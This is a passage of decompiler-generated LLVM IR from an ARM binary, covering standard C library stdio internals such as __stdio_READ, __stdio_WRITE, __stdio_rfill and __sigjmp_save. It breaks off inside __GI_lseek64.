dec_label_pc_168a4:                               ; preds = %dec_label_pc_167d4, %dec_label_pc_1683c, %dec_label_pc_167b8, %dec_label_pc_168a0
  %v0_168a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_16778, i32* @r5, align 4
  store i32 %v12_16778, i32* @r7, align 4
  ret i32 %v0_168a4

; uselistorder directives
  uselistorder i32 %v0_1685c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_16864, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_16790, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 5, 6, 0, 1, 7, 8, 9, 2, 3, 4 }
  uselistorder i32 18, { 7, 8, 6, 2, 3, 4, 9, 5, 10, 0, 11, 1, 12 }
  uselistorder i32 22, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @sp, { 2, 3, 1, 4, 0 }
  uselistorder i32 -8, { 38, 14, 11, 12, 13, 8, 21, 22, 23, 24, 25, 26, 20, 19, 10, 18, 17, 16, 15, 27, 28, 29, 30, 31, 9, 39, 32, 33, 34, 35, 36, 40, 41, 37, 42, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_168a4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1688c, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_168bc = load i32, i32* @r4, align 4
  store i32 %v3_168bc, i32* %stack_var_-12, align 4
  %v0_168c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_168c0 = inttoptr i32 %v0_168c0 to i16*
  %v2_168c0 = load i16, i16* %v1_168c0, align 2
  %v3_168c0 = zext i16 %v2_168c0 to i32
  store i32 %v3_168c0, i32* @r3, align 4
  %v1_168c4 = and i32 %v3_168c0, 4
  store i32 %v1_168c4, i32* @r5, align 4
  %v2_168c4 = icmp eq i32 %v1_168c4, 0
  store i32 %v0_168c0, i32* @r4, align 4
  br i1 %v2_168c4, label %dec_label_pc_168d8, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_168d8:                               ; preds = %entry
  %v1_168d8 = icmp slt i32 %arg2, 0
  br i1 %v1_168d8, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_168d8
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_168d8, %bb18
  %v1_168e0 = add i32 %v0_168c0, 4
  %v2_168e0 = inttoptr i32 %v1_168e0 to i32*
  %v3_168e0 = load i32, i32* %v2_168e0, align 4
  store i32 %v3_168e0, i32* %r0.global-to-local, align 4
  %v1_168e4 = call i32 @__libc_read(i32 %v3_168e0)
  store i32 %v1_168e4, i32* %r0.global-to-local, align 4
  %v5_168ec = icmp sgt i32 %v1_168e4, 0
  br i1 %v5_168ec, label %.thread7, label %dec_label_pc_168f0

dec_label_pc_168f0:                               ; preds = %bb19
  %v2_168e8 = icmp eq i32 %v1_168e4, 0
  %v0_168f0 = load i32, i32* @r4, align 4
  %v1_168f0 = inttoptr i32 %v0_168f0 to i16*
  %v2_168f0 = load i16, i16* %v1_168f0, align 2
  br i1 %v2_168e8, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_168f0
  %v2_168f4 = or i16 %v2_168f0, 4
  store i16 %v2_168f4, i16* %v1_168f0, align 2
  %v1_16910.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_168f0
  %v2_168f8 = or i16 %v2_168f0, 8
  store i16 %v2_168f8, i16* %v1_168f0, align 2
  %v1_16904 = load i32, i32* @r5, align 4
  store i32 %v1_16904, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_16910 = phi i32 [ %v1_16910.pre, %bb20 ], [ 0, %bb ], [ %v1_168e4, %bb19 ], [ %v1_16904, %bb21 ]
  %v2_1690c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1690c, i32* @r4, align 4
  ret i32 %v1_16910

; uselistorder directives
  uselistorder i16 %v2_168f0, { 1, 0 }
  uselistorder i32 %v1_168e4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_169d82 = icmp eq i32 %arg3, 0
  store i1 %v2_169d82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169d82, label %dec_label_pc_169e0, label %dec_label_pc_16930

dec_label_pc_16930:                               ; preds = %entry, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge
  %v0_1693c = phi i32 [ %v0_1693c.pre, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge ], [ %tmp, %entry ]
  %v0_16938 = phi i32 [ %v5_16948, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge ], [ %arg2, %entry ]
  %v3_16930 = phi i32 [ %v3_16930.pre, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge ], [ 2147483647, %entry ]
  %v0_16934.in = phi i32 [ %v5_1694c, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge ], [ %arg3, %entry ]
  %v3_16934 = phi i32 [ %v5_1694c, %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge ], [ %arg3, %entry ]
  %v0_16934 = icmp slt i32 %v0_16934.in, 0
  %storemerge = select i1 %v0_16934, i32 %v3_16930, i32 %v3_16934
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_16938, i32* %r1.global-to-local, align 4
  %v1_1693c = add i32 %v0_1693c, 4
  %v2_1693c = inttoptr i32 %v1_1693c to i32*
  %v3_1693c = load i32, i32* %v2_1693c, align 4
  %v3_16940 = call i32 @__GI___libc_write(i32 %v3_1693c, i32 %v0_16938)
  %v1_16944 = icmp slt i32 %v3_16940, 0
  %v2_16944 = icmp eq i32 %v3_16940, 0
  store i1 %v2_16944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16944, label %dec_label_pc_16954, label %dec_label_pc_169d8thread-pre-split

dec_label_pc_16954:                               ; preds = %dec_label_pc_16930
  %v0_16954 = load i32, i32* @r4, align 4
  %v1_16954 = inttoptr i32 %v0_16954 to i16*
  %v2_16954 = load i16, i16* %v1_16954, align 2
  %v1_16958 = or i16 %v2_16954, 8
  store i16 %v1_16958, i16* %v1_16954, align 2
  store i32 41948, i32* %r3.global-to-local, align 4
  %v0_16964 = call i32 @__aeabi_read_tp()
  %v3_16968 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_16968 = sext i16 %v3_16968 to i32
  store i32 %v4_16968, i32* %r3.global-to-local, align 4
  %v2_1696c = add i32 %v4_16968, %v0_16964
  %v3_1696c = inttoptr i32 %v2_1696c to i32*
  %v4_1696c = load i32, i32* %v3_1696c, align 4
  store i32 %v4_1696c, i32* %r3.global-to-local, align 4
  %v7_16970 = icmp eq i32 %v4_1696c, 4
  store i1 %v7_16970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16970, label %dec_label_pc_1697c, label %bb21

bb21:                                             ; preds = %dec_label_pc_16954
  %v8_16974 = icmp eq i32 %v4_1696c, 11
  store i1 %v8_16974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16974, label %dec_label_pc_1697c, label %dec_label_pc_169e0

dec_label_pc_1697c:                               ; preds = %dec_label_pc_16954, %bb21
  %v0_1697c = load i32, i32* @r4, align 4
  %v1_1697c = add i32 %v0_1697c, 8
  store i32 %v1_1697c, i32* %r2.global-to-local, align 4
  %v1_16980 = inttoptr i32 %v1_1697c to i32*
  %v2_16980 = load i32, i32* %v1_16980, align 4
  store i32 %v2_16980, i32* %r2.global-to-local, align 4
  %v3_16980 = add i32 %v0_1697c, 12
  %v4_16980 = inttoptr i32 %v3_16980 to i32*
  %v5_16980 = load i32, i32* %v4_16980, align 4
  store i32 %v5_16980, i32* %r3.global-to-local, align 4
  %v2_16984 = sub i32 %v5_16980, %v2_16980
  store i32 %v2_16984, i32* %r1.global-to-local, align 4
  %v9_16984 = icmp eq i32 %v5_16980, %v2_16980
  store i1 %v9_16984, i1* %cpsr_z.global-to-local, align 1
  %v0_169d0.pre = load i32, i32* @r5, align 4
  br i1 %v9_16984, label %dec_label_pc_169d0, label %dec_label_pc_1698c

dec_label_pc_1698c:                               ; preds = %dec_label_pc_1697c
  %v3_1698c = icmp ult i32 %v2_16984, %v0_169d0.pre
  %v9_1698c = icmp eq i32 %v2_16984, %v0_169d0.pre
  store i1 %v9_1698c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1698c, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_1698c
  store i32 %v0_169d0.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_1698c, %bb22, %dec_label_pc_169b4
  %v2_169a0 = phi i32 [ %v1_169b8, %dec_label_pc_169b4 ], [ %v2_16980, %bb22 ], [ %v2_16980, %dec_label_pc_1698c ]
  %v0_16994 = load i32, i32* @r6, align 4
  %v1_16994 = inttoptr i32 %v0_16994 to i8*
  %v2_16994 = load i8, i8* %v1_16994, align 1
  %v3_16994 = zext i8 %v2_16994 to i32
  store i32 %v3_16994, i32* %r3.global-to-local, align 4
  %v7_16998 = icmp eq i8 %v2_16994, 10
  store i1 %v7_16998, i1* %cpsr_z.global-to-local, align 1
  %v1_1699c = add i32 %v0_16994, 1
  store i32 %v1_1699c, i32* @r6, align 4
  %v3_169a0 = inttoptr i32 %v2_169a0 to i8*
  store i8 %v2_16994, i8* %v3_169a0, align 1
  %v0_169a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169a4, label %dec_label_pc_169a8, label %dec_label_pc_169b4

dec_label_pc_169a8:                               ; preds = %.preheader
  %v0_169a8 = load i32, i32* @r4, align 4
  %v1_169a8 = inttoptr i32 %v0_169a8 to i16*
  %v2_169a8 = load i16, i16* %v1_169a8, align 2
  %v3_169a8 = zext i16 %v2_169a8 to i32
  store i32 %v3_169a8, i32* %r3.global-to-local, align 4
  %v1_169ac = and i32 %v3_169a8, 256
  %v2_169ac = icmp eq i32 %v1_169ac, 0
  store i1 %v2_169ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169ac, label %dec_label_pc_169b4, label %dec_label_pc_169a8.dec_label_pc_169c0_crit_edge

dec_label_pc_169a8.dec_label_pc_169c0_crit_edge:  ; preds = %dec_label_pc_169a8
  %v0_169c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_169c0

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169a8, %.preheader
  %v0_169b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_169b4 = add i32 %v0_169b4, -1
  store i32 %v1_169b4, i32* %r1.global-to-local, align 4
  %v7_169b4 = icmp eq i32 %v0_169b4, 1
  store i1 %v7_169b4, i1* %cpsr_z.global-to-local, align 1
  %v0_169b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169b8 = add i32 %v0_169b8, 1
  store i32 %v1_169b8, i32* %r2.global-to-local, align 4
  br i1 %v7_169b4, label %dec_label_pc_169b4.dec_label_pc_169c0_crit_edge, label %.preheader

dec_label_pc_169b4.dec_label_pc_169c0_crit_edge:  ; preds = %dec_label_pc_169b4
  %v0_169c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %dec_label_pc_169a8.dec_label_pc_169c0_crit_edge, %dec_label_pc_169b4.dec_label_pc_169c0_crit_edge
  %v0_169c4 = phi i32 [ %v1_169b8, %dec_label_pc_169b4.dec_label_pc_169c0_crit_edge ], [ %v0_169c4.pre, %dec_label_pc_169a8.dec_label_pc_169c0_crit_edge ]
  %v0_169c0 = phi i32 [ %v0_169c0.pre, %dec_label_pc_169b4.dec_label_pc_169c0_crit_edge ], [ %v0_169a8, %dec_label_pc_169a8.dec_label_pc_169c0_crit_edge ]
  %v1_169c0 = add i32 %v0_169c0, 8
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  store i32 %v3_169c0, i32* %r3.global-to-local, align 4
  %v2_169c4 = add i32 %v0_169c0, 16
  %v3_169c4 = inttoptr i32 %v2_169c4 to i32*
  store i32 %v0_169c4, i32* %v3_169c4, align 4
  %v0_169c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_169c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_169c8 = sub i32 %v1_169c8, %v0_169c8
  store i32 %v2_169c8, i32* %r3.global-to-local, align 4
  %v1_169cc = load i32, i32* @r5, align 4
  %v2_169cc = sub i32 %v1_169cc, %v2_169c8
  br label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_1697c, %dec_label_pc_169c0
  %v0_169d0 = phi i32 [ %v2_169cc, %dec_label_pc_169c0 ], [ %v0_169d0.pre, %dec_label_pc_1697c ]
  %v1_169d0 = load i32, i32* @r7, align 4
  %v2_169d0 = sub i32 %v1_169d0, %v0_169d0
  store i32 %v2_169d0, i32* @r7, align 4
  br label %dec_label_pc_169e0

dec_label_pc_169d8thread-pre-split:               ; preds = %dec_label_pc_16930
  %v3_16948 = load i32, i32* @r6, align 4
  %v5_16948 = add i32 %v3_16948, %v3_16940
  store i32 %v5_16948, i32* @r6, align 4
  %v4_1694c = load i32, i32* @r5, align 4
  %v5_1694c = sub i32 %v4_1694c, %v3_16940
  store i32 %v5_1694c, i32* @r5, align 4
  %v2_169d8 = icmp eq i32 %v5_1694c, 0
  store i1 %v2_169d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169d8, label %dec_label_pc_169e0, label %dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge

dec_label_pc_169d8thread-pre-split.dec_label_pc_16930_crit_edge: ; preds = %dec_label_pc_169d8thread-pre-split
  %v3_16930.pre = load i32, i32* @r8, align 4
  %v0_1693c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16930

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169d8thread-pre-split, %entry, %bb21, %dec_label_pc_169d0
  %v0_169e0 = load i32, i32* @r7, align 4
  ret i32 %v0_169e0

; uselistorder directives
  uselistorder i32 %v5_1694c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_16948, { 1, 0 }
  uselistorder i32 %v0_169c0, { 1, 0 }
  uselistorder i32 %v1_169b8, { 0, 2, 1 }
  uselistorder i32 %v0_169b4, { 1, 0 }
  uselistorder i32 %v0_169d0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_16980, { 1, 0, 2 }
  uselistorder i32 %v2_16980, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_16940, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16938, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 1, 0 }
  uselistorder i32 11, { 16, 10, 11, 12, 28, 29, 0, 17, 2, 13, 3, 14, 4, 15, 18, 19, 20, 5, 21, 6, 22, 7, 23, 24, 8, 25, 9, 26, 1, 27, 30 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_169e0, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_169d0, { 1, 0 }
  uselistorder label %dec_label_pc_169c0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1697c, { 1, 0 }
  uselistorder label %dec_label_pc_16930, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_169f0 = load i32, i32* @r4, align 4
  store i32 %v3_169f0, i32* %stack_var_-8, align 4
  %v1_169f4 = add i32 %arg1, 8
  %v1_169f8 = inttoptr i32 %v1_169f4 to i32*
  %v2_169f8 = load i32, i32* %v1_169f8, align 4
  store i32 %v2_169f8, i32* @r1, align 4
  %v3_169f8 = add i32 %arg1, 12
  %v4_169f8 = inttoptr i32 %v3_169f8 to i32*
  %v5_169f8 = load i32, i32* %v4_169f8, align 4
  %v2_169fc = sub i32 %v5_169f8, %v2_169f8
  store i32 %v2_169fc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16a04 = inttoptr i32 %arg1 to i16*
  %v4_16a04 = call i32 @__stdio_READ(i16* %v3_16a04, i32 %v2_169f8, i32 %v2_169fc)
  %v0_16a08 = load i32, i32* @r4, align 4
  %v1_16a08 = add i32 %v0_16a08, 8
  %v2_16a08 = inttoptr i32 %v1_16a08 to i32*
  %v3_16a08 = load i32, i32* %v2_16a08, align 4
  store i32 %v3_16a08, i32* %r2.global-to-local, align 4
  %v2_16a0c = add i32 %v3_16a08, %v4_16a04
  %v2_16a10 = add i32 %v0_16a08, 20
  %v3_16a10 = inttoptr i32 %v2_16a10 to i32*
  store i32 %v2_16a0c, i32* %v3_16a10, align 4
  %v0_16a14 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a14 = load i32, i32* @r4, align 4
  %v2_16a14 = add i32 %v1_16a14, 16
  %v3_16a14 = inttoptr i32 %v2_16a14 to i32*
  store i32 %v0_16a14, i32* %v3_16a14, align 4
  %v2_16a18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16a18, i32* @r4, align 4
  ret i32 %v4_16a04

; uselistorder directives
  uselistorder i32 %v4_16a04, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16a20 = load i32, i32* @r4, align 4
  store i32 %v3_16a20, i32* %stack_var_-12, align 4
  %v0_16a24 = load i32, i32* @r0, align 4
  %v1_16a24 = inttoptr i32 %v0_16a24 to i16*
  %v2_16a24 = load i16, i16* %v1_16a24, align 2
  %v3_16a24 = zext i16 %v2_16a24 to i32
  store i32 %v3_16a24, i32* %r3.global-to-local, align 4
  %v0_16a28 = load i32, i32* @r1, align 4
  %v2_16a28 = and i32 %v0_16a28, %v3_16a24
  %v4_16a28 = icmp eq i32 %v2_16a28, 0
  store i32 %v0_16a24, i32* @r4, align 4
  br i1 %v4_16a28, label %dec_label_pc_16a38, label %dec_label_pc_16a48

dec_label_pc_16a38:                               ; preds = %entry
  %v1_16a38 = and i32 %v3_16a24, 2176
  %v2_16a38 = icmp eq i32 %v1_16a38, 0
  br i1 %v2_16a38, label %dec_label_pc_16a40, label %dec_label_pc_16a54

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a38
  %v2_16a40 = or i32 %v0_16a28, %v3_16a24
  store i32 %v2_16a40, i32* %r3.global-to-local, align 4
  %v1_16a44 = trunc i32 %v2_16a40 to i16
  store i16 %v1_16a44, i16* %v1_16a24, align 2
  %v0_16a48.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16a48

dec_label_pc_16a48:                               ; preds = %entry, %dec_label_pc_16a40
  %v0_16a48 = phi i32 [ %v0_16a24, %entry ], [ %v0_16a48.pre, %dec_label_pc_16a40 ]
  %v1_16a48 = inttoptr i32 %v0_16a48 to i16*
  %v2_16a48 = load i16, i16* %v1_16a48, align 2
  %v3_16a48 = zext i16 %v2_16a48 to i32
  store i32 %v3_16a48, i32* %r3.global-to-local, align 4
  %v1_16a4c = and i32 %v3_16a48, 16
  store i32 %v1_16a4c, i32* %r5.global-to-local, align 4
  %v2_16a4c = icmp eq i32 %v1_16a4c, 0
  br i1 %v2_16a4c, label %dec_label_pc_16a7c, label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a38, %dec_label_pc_16a48
  store i32 41704, i32* %r3.global-to-local, align 4
  %v0_16a58 = call i32 @__aeabi_read_tp()
  store i32 %v0_16a58, i32* %r0.global-to-local, align 4
  %v3_16a5c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_16a5c = sext i16 %v3_16a5c to i32
  store i32 %v4_16a5c, i32* %r3.global-to-local, align 4
  %v3_16a64 = add i32 %v4_16a5c, %v0_16a58
  %v4_16a64 = inttoptr i32 %v3_16a64 to i32*
  store i32 9, i32* %v4_16a64, align 4
  br label %dec_label_pc_16a68

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a84, %dec_label_pc_16a54
  %v0_16a68 = load i32, i32* @r4, align 4
  %v1_16a68 = inttoptr i32 %v0_16a68 to i16*
  %v2_16a68 = load i16, i16* %v1_16a68, align 2
  %v3_16a68 = zext i16 %v2_16a68 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16a70 = or i32 %v3_16a68, 8
  store i32 %v1_16a70, i32* %r3.global-to-local, align 4
  %v1_16a74 = trunc i32 %v1_16a70 to i16
  store i16 %v1_16a74, i16* %v1_16a68, align 2
  %v1_16abc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab4

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a48
  %v1_16a7c = and i32 %v3_16a48, 64
  %v2_16a7c = icmp eq i32 %v1_16a7c, 0
  br i1 %v2_16a7c, label %dec_label_pc_16aa4, label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a7c
  %v0_16a84 = load i32, i32* @r0, align 4
  %v1_16a84 = call i32 @__stdio_wcommit(i32 %v0_16a84)
  store i32 %v1_16a84, i32* %r0.global-to-local, align 4
  %v2_16a88 = icmp eq i32 %v1_16a84, 0
  br i1 %v2_16a88, label %dec_label_pc_16a90, label %dec_label_pc_16a68

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a84
  %v0_16a90 = load i32, i32* @r4, align 4
  %v1_16a90 = inttoptr i32 %v0_16a90 to i16*
  %v2_16a90 = load i16, i16* %v1_16a90, align 2
  %v3_16a90 = zext i16 %v2_16a90 to i32
  store i32 %v3_16a90, i32* %r3.global-to-local, align 4
  %v1_16a94 = add i32 %v0_16a90, 8
  %v2_16a94 = inttoptr i32 %v1_16a94 to i32*
  %v3_16a94 = load i32, i32* %v2_16a94, align 4
  %v1_16a98 = and i32 %v3_16a90, 65471
  store i32 %v1_16a98, i32* %r3.global-to-local, align 4
  %v2_16a9c = add i32 %v0_16a90, 28
  %v3_16a9c = inttoptr i32 %v2_16a9c to i32*
  store i32 %v3_16a94, i32* %v3_16a9c, align 4
  %v0_16aa0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16aa0 = trunc i32 %v0_16aa0 to i16
  %v2_16aa0 = load i32, i32* @r4, align 4
  %v3_16aa0 = inttoptr i32 %v2_16aa0 to i16*
  store i16 %v1_16aa0, i16* %v3_16aa0, align 2
  %v0_16aa4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16aa4

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a7c, %dec_label_pc_16a90
  %v2_16aac = phi i32 [ %v0_16a48, %dec_label_pc_16a7c ], [ %v0_16aa4.pre, %dec_label_pc_16a90 ]
  %v1_16aa4 = inttoptr i32 %v2_16aac to i16*
  %v2_16aa4 = load i16, i16* %v1_16aa4, align 2
  %v3_16aa4 = zext i16 %v2_16aa4 to i32
  %v1_16aa8 = or i32 %v3_16aa4, 1
  store i32 %v1_16aa8, i32* %r3.global-to-local, align 4
  %v1_16aac = trunc i32 %v1_16aa8 to i16
  store i16 %v1_16aac, i16* %v1_16aa4, align 2
  %v0_16ab0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ab0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab4

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16a68, %dec_label_pc_16aa4
  %v1_16abc = phi i32 [ %v1_16abc.pre, %dec_label_pc_16a68 ], [ %v0_16ab0, %dec_label_pc_16aa4 ]
  %v2_16ab8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ab8, i32* @r4, align 4
  ret i32 %v1_16abc

; uselistorder directives
  uselistorder i32 %v3_16a24, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ab4, { 1, 0 }
  uselistorder label %dec_label_pc_16aa4, { 1, 0 }
  uselistorder label %dec_label_pc_16a54, { 1, 0 }
  uselistorder label %dec_label_pc_16a48, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_16ac4 = load i32, i32* @r4, align 4
  %v6_16ac4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_16ad4 = call i32 @memcpy()
  %v0_16ad8 = load i32, i32* @r5, align 4
  %v1_16ad8 = load i32, i32* @r4, align 4
  %v2_16ad8 = add i32 %v1_16ad8, %v0_16ad8
  store i32 %v3_16ac4, i32* @r4, align 4
  store i32 %v6_16ac4, i32* @r5, align 4
  ret i32 %v2_16ad8
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_16ae8 = load i32, i32* @r1, align 4
  %v2_16ae8 = icmp eq i32 %v0_16ae8, 0
  %v3_16aec = load i32, i32* @r4, align 4
  store i32 %v3_16aec, i32* %stack_var_-8, align 4
  %v0_16af0 = load i32, i32* @r0, align 4
  store i32 %v0_16af0, i32* %r4.global-to-local, align 4
  br i1 %v2_16ae8, label %dec_label_pc_16b14, label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %entry
  %v1_16b00 = add i32 %v0_16af0, 260
  %v4_16b04 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_16b00)
  %v2_16b08 = icmp eq i32 %v4_16b04, 0
  br i1 %v2_16b08, label %dec_label_pc_16b18, label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16af8, %entry
  br label %dec_label_pc_16b18

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16af8, %dec_label_pc_16b14
  %storemerge = phi i32 [ 0, %dec_label_pc_16b14 ], [ 1, %dec_label_pc_16af8 ]
  %v1_16b1c = load i32, i32* %r4.global-to-local, align 4
  %v2_16b1c = add i32 %v1_16b1c, 256
  %v3_16b1c = inttoptr i32 %v2_16b1c to i32*
  store i32 %storemerge, i32* %v3_16b1c, align 4
  %v2_16b20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16b20, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 8, 0, 3, 4, 1, 5, 6, 9, 10, 11, 12, 13, 14, 15, 7, 16, 17, 18, 19, 20, 2, 21, 22, 23 }
  uselistorder i32 260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b18, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_16b70, label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %entry
  %v0_16b58 = call i32 @__aeabi_read_tp()
  %v3_16b5c = load i16, i16* @global_var_20d4c.598, align 2
